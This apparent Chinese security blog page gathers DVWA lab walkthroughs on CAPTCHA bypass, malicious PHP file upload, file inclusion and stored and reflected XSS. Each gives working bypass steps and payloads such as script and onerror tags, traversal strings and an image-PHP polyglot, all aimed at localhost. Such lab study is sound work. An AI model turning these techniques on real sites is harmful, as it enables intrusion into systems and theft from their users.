<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
    
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title>
     Hexo
  </title>
  
  <link rel="shortcut icon" href="/favicon.ico" />
  
  
<link rel="stylesheet" href="/css/style.css">
  
<script src="/js/pace.min.js"></script>


  

  

<meta name="generator" content="Hexo 4.1.1"></head>

</html>

<body>
  <div id="app">
    <main class="content">
      
<section class="cover">
    
      
      <a class="forkMe" href="https://github.com/Shen-Yu/hexo-theme-ayer"
        target="_blank"><img width="149" height="149" src="/images/forkme.png"
          class="attachment-full size-full" alt="Fork me on GitHub" data-recalc-dims="1"></a>
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/cover1.jpg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">Hexo</a></h1>
      <h2></h2>
      <div>
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="#main" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>

<div id="main">
  <section class="outer">
  <article class="articles">
    
    <h1 class="page-type-title"></h1>

    
    
    <article id="post-Insecure CAPTCHA" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/01/09/Insecure%20CAPTCHA/"
    >Insecure CAPTCHA</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/01/09/Insecure%20CAPTCHA/" class="article-date">
  <time datetime="2020-01-09T15:52:54.732Z" itemprop="datePublished">2020-01-09</time>
</a>
      
    </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h1 id="Insecure-CAPTCHA"><a href="#Insecure-CAPTCHA" class="headerlink" title="Insecure CAPTCHA"></a>Insecure CAPTCHA</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>首先查看源码</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/Insecure%20CAPTCHA/29.jpg" alt=""></p>
<p>服务器端核心代码显示服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交post请求，服务器完成更改密码的操作。但是，这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change、step 参数来判断用户是否已经输入了正确的验证码。</p>
<p>通过构造参数绕过验证过程的第一步</p>
<p>首先输入密码，点击Change按钮，抓包：</p>
<p>更改step的参数为2绕过验证码</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/Insecure%20CAPTCHA/30.jpg" alt=""></p>
<p>提交之后显示修改密码成功</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/Insecure%20CAPTCHA/31.jpg" alt=""></p>
<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p>首先查看源码</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/Insecure%20CAPTCHA/32.jpg" alt=""></p>
<p>可以看到，Medium级别的代码在第二步验证时，参加了对参数passed_captcha的检查，如果参数值为true，则认为用户已经通过了验证码检查，然而用户依然可以通过伪造参数绕过验证，本质上来说，这与Low级别的验证没有任何区别。</p>
<p>再次进行抓包，修改step参数，并且增加passed_captcha参数</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/Insecure%20CAPTCHA/33.jpg" alt=""></p>
<p>可以看到成功绕过验证码</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/Insecure%20CAPTCHA/34.jpg" alt=""></p>
<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>首先查看源代码</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/Insecure%20CAPTCHA/35.jpg" alt=""></p>
<p>可以看到，服务器的验证逻辑是当$resp（这里是指谷歌返回的验证结果）是false，并且参数recaptcha_response_field不等于hidd3n_valu3（或者http包头的User-Agent参数不等于reCAPTCHA）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。</p>
<p>由于$resp参数我们无法控制，所以重心放在token参数、User-Agent上，进行抓包，更改token的参数，在&amp;Change=Change参数后面新增一个g-recaptcha-response=hidd3n_valu3，即&amp;Change=Change&amp;g-recaptcha-response=hidd3n_valu3。并将请求头的User-Agent的值改为reCAPTCHA</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/Insecure%20CAPTCHA/36.jpg" alt=""></p>
<p>可以看到更改成功</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/Insecure%20CAPTCHA/37.jpg" alt=""></p>

      
      <!-- 打赏 -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/09/Insecure%20CAPTCHA/" data-id="ck56xjxcf0002ksvogfdg4tyv"
        class="article-share-link">分享</a>
      
    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-File Upload" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/01/09/File%20Upload/"
    >File Upload</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/01/09/File%20Upload/" class="article-date">
  <time datetime="2020-01-09T15:44:03.954Z" itemprop="datePublished">2020-01-09</time>
</a>
      
    </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h1 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>首先查看源码</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Upload/12.jpg" alt=""></p>
<p>我们可以看到看到它对上传的文件没有任何的要求，文件类型或是文件大小都没有做规定，于是我们可以轻松的传我们的木马上去</p>
<p>编写php文件</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Upload/13.jpg" alt=""></p>
<p>上传成功</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Upload/14.jpg" alt=""></p>
<p>我们登录</p>
<p>[]: <a href="http://localhost/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/hack.php" target="_blank" rel="noopener">http://localhost/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/hack.php</a></p>
<p>跳转到上传的php文件，发现文件内容被成功执行</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Upload/15.jpg" alt=""></p>
<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p>首先查看源码</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Upload/16.jpg" alt=""></p>
<p>仅前端判断文件后缀名，当前端提示不能发送非jpg、png格式</p>
<p>首先打开我们的php木马</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Upload/17.jpg" alt=""></p>
<p>设置浏览器代理用来抓包</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Upload/18.jpg" alt=""></p>
<p>打开Burp Suite，配置好Proxy -》 Options，并在Proxy-》Intercept-》Intercept is on </p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Upload/19.jpg" alt=""></p>
<p>此时把要上传的nosafe.php后缀改为jpg，然后提交，在Burp Suite中的filename中把文件nosafe.jpg后缀改为nosafe.php，并且修改大小限制为200000</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Upload/20.jpg" alt=""></p>
<p>可以看见文件成功上传</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Upload/21.jpg" alt=""></p>
<p>登录</p>
<p>[]: <a href="http://localhost/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/nosafe.php" target="_blank" rel="noopener">http://localhost/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/nosafe.php</a></p>
<p>可以看到木马成功运行，显示了dvwa的后台</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Upload/22.jpg" alt=""></p>
<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>首先查看源码</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Upload/23.jpg" alt=""></p>
<p>strrpos(string,find,start)</p>
<p>函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。</p>
<p>getimagesize(string filename)</p>
<p>函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。</p>
<p>可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”<em>.jpg”、”</em>.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。</p>
<p>准备一个图片1.jpeg和1.php脚本，php脚本中写入方法打开phpinfo文件</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Upload/24.jpg" alt=""></p>
<p>windows下打开cmd运行</p>
<p>copy 1.png/b+1.php/a 1.png</p>
<p>将png文件和php文件生成一个新的图片</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Upload/25.jpg" alt=""></p>
<p>可以看到，新的图片最后包含了php代码</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Upload/26.jpg" alt=""></p>
<p>我们将1.png上传</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Upload/27.jpg" alt=""></p>
<p>此时，登录</p>
<p>[]: localhost/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/1.png</p>
<p>访问上传的png，发现其中的php代码成功执行</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Upload/28.jpg" alt=""></p>

      
      <!-- 打赏 -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/09/File%20Upload/" data-id="ck56xjx7k0000ksvog6j71ujr"
        class="article-share-link">分享</a>
      
    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-File Inclusion" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/01/09/File%20Inclusion/"
    >File Inclusion</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/01/09/File%20Inclusion/" class="article-date">
  <time datetime="2020-01-09T15:32:48.500Z" itemprop="datePublished">2020-01-09</time>
</a>
      
    </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>进入页面</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Inclusion/1.jpg" alt=""></p>
<p>我们先来看看源码：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Inclusion/2.jpg" alt=""></p>
<p>分析源码，可以看到没有对page参数做任何过滤</p>
<p>编写txt文件放到html文件夹中</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Inclusion/3.jpg" alt=""></p>
<p>登录</p>
<p>[]: <a href="http://localhost/dvwa/vulnerabilities/fi/?page=http://127.0.0.1/test1low.txt" target="_blank" rel="noopener">http://localhost/dvwa/vulnerabilities/fi/?page=http://127.0.0.1/test1low.txt</a></p>
<p>发现成功读取txt内容</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Inclusion/4.jpg" alt=""></p>
<p>编写php文件，目的是使用phpinfo函数打开phpinfo文件</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Inclusion/5.jpg" alt=""></p>
<p>访问</p>
<p>[]: <a href="http://localhost/dvwa/vulnerabilities/fi/?page=http://127.0.0.1/test1low.php" target="_blank" rel="noopener">http://localhost/dvwa/vulnerabilities/fi/?page=http://127.0.0.1/test1low.php</a></p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Inclusion/6.jpg" alt=""></p>
<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p>我们先来看源代码:</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Inclusion/7.jpg" alt=""></p>
<p>分析源码,可以看到使用str_replace函数对http://、https://、../ 、..\进行了过滤,但可以通过双写来绕过，或者使用绝对路径来绕过</p>
<p>即过滤了远程文件包含, 对于本地文件包含并没有任何过滤：</p>
<p>本地包含采用相对路径访问</p>
<p>[]: <a href="http://localhost/dvwa/vulnerabilities/fi/?page=..././..././test1medium" target="_blank" rel="noopener">http://localhost/dvwa/vulnerabilities/fi/?page=..././..././test1medium</a></p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Inclusion/8.jpg" alt=""></p>
<p>远程包含采用更改http为Http的方式绕过防御</p>
<p>[]: <a href="http://localhost/dvwa/vulnerabilities/fi/?page=Http://127.0.0.1/test1medium.txt" target="_blank" rel="noopener">http://localhost/dvwa/vulnerabilities/fi/?page=Http://127.0.0.1/test1medium.txt</a></p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Inclusion/9.jpg" alt=""></p>
<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>我们先来看源代码:</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Inclusion/10.jpg" alt=""></p>
<p>分析源码可以看到,如果$file变量中不含有file并且$file不等于include.php，此时服务器才不会去包含文件，两个条件只要不满足其中任意一个,就能达到文件包含的目的,可以使用file协议来绕过</p>
<p> 输入</p>
<p>[]: <a href="http://localhost/dvwa/vulnerabilities/fi/?page=file:///var/www/html/test1high.txt" target="_blank" rel="noopener">http://localhost/dvwa/vulnerabilities/fi/?page=file:///var/www/html/test1high.txt</a></p>
<p>绕过防御</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/File%20Inclusion/11.jpg" alt=""></p>

      
      <!-- 打赏 -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/09/File%20Inclusion/" data-id="ck56xjxcb0001ksvofzu764zd"
        class="article-share-link">分享</a>
      
    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-XSS_S" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/01/09/XSS_S/"
    >XSS_S</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/01/09/XSS_S/" class="article-date">
  <time datetime="2020-01-09T06:14:53.288Z" itemprop="datePublished">2020-01-09</time>
</a>
      
    </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h1 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h1><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>服务器端核心代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $message &#x3D; trim( $_POST[ &#39;mtxMessage&#39; ] ); </span><br><span class="line">    $name    &#x3D; trim( $_POST[ &#39;txtName&#39; ] ); </span><br><span class="line">    &#x2F;&#x2F; Sanitize message input </span><br><span class="line">    $message &#x3D; stripslashes( $message ); </span><br><span class="line">    $message &#x3D; mysql_real_escape_string( $message ); </span><br><span class="line">    &#x2F;&#x2F; Sanitize name input </span><br><span class="line">    $name &#x3D; mysql_real_escape_string( $name ); </span><br><span class="line">    &#x2F;&#x2F; Update database </span><br><span class="line">    $query  &#x3D; &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; </span><br><span class="line">    $result &#x3D; mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;&#x2F;pre&gt;&#39; ); </span><br><span class="line">    &#x2F;&#x2F;mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>相关函数介绍</p>
<p>trim(string,charlist)</p>
<p>函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。</p>
<p>mysql_real_escape_string(string,connection)</p>
<p>函数会对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。</p>
<p>stripslashes(string)</p>
<p>函数删除字符串中的反斜杠。</p>
<p>可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>message一栏输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>成功弹框，如下图所示：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_S/37.PNG" alt=""></p>
<p>name一栏前端有字数限制，抓包改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x2F;name&#x2F;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>成功弹框，如下图所示：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_S/38.PNG" alt=""></p>
<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>服务器端核心代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $message &#x3D; trim( $_POST[ &#39;mtxMessage&#39; ] ); </span><br><span class="line">    $name    &#x3D; trim( $_POST[ &#39;txtName&#39; ] ); </span><br><span class="line">    &#x2F;&#x2F; Sanitize message input </span><br><span class="line">    $message &#x3D; strip_tags( addslashes( $message ) ); </span><br><span class="line">    $message &#x3D; mysql_real_escape_string( $message ); </span><br><span class="line">    $message &#x3D; htmlspecialchars( $message ); </span><br><span class="line">    &#x2F;&#x2F; Sanitize name input </span><br><span class="line">    $name &#x3D; str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name ); </span><br><span class="line">    $name &#x3D; mysql_real_escape_string( $name ); </span><br><span class="line">    &#x2F;&#x2F; Update database </span><br><span class="line">    $query  &#x3D; &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; </span><br><span class="line">    $result &#x3D; mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;&#x2F;pre&gt;&#39; ); </span><br><span class="line">    &#x2F;&#x2F;mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>相关函数说明</p>
<p>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用<b>标签。</p>
<p>addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。</p>
<p>可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了<script>字符串，仍然存在存储型的XSS。</p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1.双写绕过</p>
<p>抓包改name参数为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;ript&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>如下图所示:</p>
<p><img src="Ehttps://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_S/39.PNG" alt=""></p>
<p>成功弹窗，如下图所示：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_S/40.PNG" alt=""></p>
<p>2.大小写混淆绕过</p>
<p>抓包改name参数为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>如下图所示:</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_S/41.PNG" alt=""></p>
<p>成功弹窗，如下图所示：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_S/42.PNG" alt=""></p>
<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>服务器端核心代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $message &#x3D; trim( $_POST[ &#39;mtxMessage&#39; ] ); </span><br><span class="line">    $name    &#x3D; trim( $_POST[ &#39;txtName&#39; ] ); </span><br><span class="line">    &#x2F;&#x2F; Sanitize message input </span><br><span class="line">    $message &#x3D; strip_tags( addslashes( $message ) ); </span><br><span class="line">    $message &#x3D; mysql_real_escape_string( $message ); </span><br><span class="line">    $message &#x3D; htmlspecialchars( $message ); </span><br><span class="line">    &#x2F;&#x2F; Sanitize name input </span><br><span class="line">    $name &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $name ); </span><br><span class="line">    $name &#x3D; mysql_real_escape_string( $name ); </span><br><span class="line">    &#x2F;&#x2F; Update database </span><br><span class="line">    $query  &#x3D; &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; </span><br><span class="line">    $result &#x3D; mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;&#x2F;pre&gt;&#39; ); </span><br><span class="line">    &#x2F;&#x2F;mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到，这里使用正则表达式过滤了<script>标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。</p>
<p>抓包改name参数为<img src=1 onerror=alert(1)>，如下图所示：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_S/43.PNG" alt=""></p>
<p>成功弹窗，如下图所示：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_S/44.PNG" alt=""></p>
<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>服务器端核心代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $message &#x3D; trim( $_POST[ &#39;mtxMessage&#39; ] ); </span><br><span class="line">    $name    &#x3D; trim( $_POST[ &#39;txtName&#39; ] ); </span><br><span class="line">    &#x2F;&#x2F; Sanitize message input </span><br><span class="line">    $message &#x3D; stripslashes( $message ); </span><br><span class="line">    $message &#x3D; mysql_real_escape_string( $message ); </span><br><span class="line">    $message &#x3D; htmlspecialchars( $message ); </span><br><span class="line">    &#x2F;&#x2F; Sanitize name input </span><br><span class="line">    $name &#x3D; stripslashes( $name ); </span><br><span class="line">    $name &#x3D; mysql_real_escape_string( $name ); </span><br><span class="line">    $name &#x3D; htmlspecialchars( $name ); </span><br><span class="line">    &#x2F;&#x2F; Update database </span><br><span class="line">    $data &#x3D; $db-&gt;prepare( &#39;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#39; ); </span><br><span class="line">    $data-&gt;bindParam( &#39;:message&#39;, $message, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;bindParam( &#39;:name&#39;, $name, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;execute(); </span><br><span class="line">&#125; </span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到，通过使用htmlspecialchars函数，解决了XSS，但是要注意的是，如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。</p>

      
      <!-- 打赏 -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/09/XSS_S/" data-id="ck56chf9h0003fcvo3qzn0dpo"
        class="article-share-link">分享</a>
      
    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-XSS_R" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/01/09/XSS_R/"
    >XSS_R</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/01/09/XSS_R/" class="article-date">
  <time datetime="2020-01-09T06:14:53.284Z" itemprop="datePublished">2020-01-09</time>
</a>
      
    </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h1 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h1><p>下面对四种级别的代码进行分析。</p>
<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>服务器端核心代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">&#x2F;&#x2F; Is there any input? </span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Feedback for end user </span><br><span class="line">    echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>成功弹框，如下图所示：</p>
<p><img src="E:%5C%E8%AF%BE%E8%AE%BE%E6%88%AA%E5%9B%BE%5C33.PNG" alt=""></p>
